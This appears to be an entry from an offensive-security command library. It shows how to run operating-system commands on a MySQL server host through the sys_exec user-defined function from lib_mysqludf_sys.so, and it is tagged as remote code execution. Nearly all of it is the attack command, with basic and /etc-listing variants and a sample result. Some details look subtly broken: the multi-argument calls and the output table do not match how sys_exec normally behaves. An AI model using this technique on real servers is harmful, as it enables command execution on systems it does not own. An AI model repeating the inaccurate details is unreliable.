---
id: acbfbff4-d644-489d-a03e-e3a2b9263f5e
name: mysql-sys-exec-ls-directory
type: command
executor: sql
data: 'SELECT sys_exec(''ls'', ''-l'');'
output: null
created_at: '2023-04-06T03:56:44.558781+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - rce
  - mysql-udf
verified: true
validated: true
---

# mysql-sys-exec-ls-directory

## Command

```sql
SELECT sys_exec('ls', '-l');
```

## Description

Executes the 'ls -l' command on the MySQL server host using the sys_exec UDF function from lib_mysqludf_sys.so. This lists files in the current directory with details, demonstrating basic RCE capability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'ls' | The base command to execute | Yes |
| '-l' | Arguments for detailed listing | No |

## Examples

### Basic Usage

Connect to MySQL and run:
```sql
SELECT sys_exec('ls', '-l');
```

### Advanced Usage

For a specific directory:
```sql
SELECT sys_exec('ls', '-l', '/etc');
```

## Expected Output

A MySQL result set showing:
```
+------------------------+
| sys_exec('ls', '-l')   |
+------------------------+
| total 8
-rw-r--r-- 1 root root 1234 ... passwd
...                     |
+------------------------+
```

## Related

- [[procedures/MySQL-UDF-Command-Execution-via-lib_mysqludf_sys.so]]
